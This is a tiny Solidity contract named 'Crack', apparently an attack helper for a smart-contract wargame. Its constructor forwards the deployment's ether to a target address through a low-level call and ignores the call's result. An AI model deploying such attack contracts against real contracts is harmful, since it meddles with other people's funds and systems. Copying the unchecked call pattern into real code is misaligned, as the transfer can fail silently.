pragma solidity ^0.6.0;

contract Crack {
    constructor(address payable _target) public payable {
        require(msg.value > 0, "Create contract with at least 1 Finney, 0.001 ETH");
       _target.call{value: msg.value}("");
    }
}